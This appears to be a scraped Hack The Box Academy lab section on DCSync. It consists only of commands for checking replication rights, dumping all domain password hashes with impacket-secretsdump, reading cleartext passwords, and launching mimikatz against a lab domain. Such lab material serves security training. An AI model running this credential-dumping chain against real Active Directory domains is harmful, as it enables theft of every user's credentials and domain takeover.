# Section 22: DCSync

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1489
- Code/command blocks: 9

> Terminal output is omitted; only commands & scripts are captured.

```powershell
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

```powershell
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

```bash
impacket-secretsdump -outputfile inlanefreight_hashes -just-dc {{DOMAIN_NB}}/adunn@{{DC_IP}} 
```

```bash
ls inlanefreight_hashes*
```

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

```bash
cat inlanefreight_hashes.ntds.cleartext 
```

```cmd
runas /netonly /user:{{DOMAIN_NB}}\adunn powershell
```

```powershell
.\mimikatz.exe
```

